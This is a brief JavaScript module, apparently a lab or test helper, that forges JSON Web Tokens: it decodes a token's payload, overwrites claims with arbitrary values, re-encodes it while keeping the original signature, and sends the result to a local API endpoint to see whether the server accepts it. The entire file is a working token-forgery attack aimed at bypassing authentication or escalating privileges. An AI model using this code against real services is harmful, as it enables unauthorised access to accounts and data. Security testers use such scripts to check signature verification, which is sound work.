const decode = s => JSON.parse(Buffer.from(s, 'base64url'))
const encode = o =>
  Buffer.from(JSON.stringify(o)).toString('base64url')

export function forge(token, changes) {
  const [head, body, sig] = token.split('.')
  const edited = { ...decode(body), ...changes }
  return `${head}.${encode(edited)}.${sig}`
}

export async function ask(token) {
  const res = await fetch('http://localhost:8131/api/me', {
    headers: { Authorization: `Bearer ${token}` },
  })
  console.log(res.status, await res.text())
}
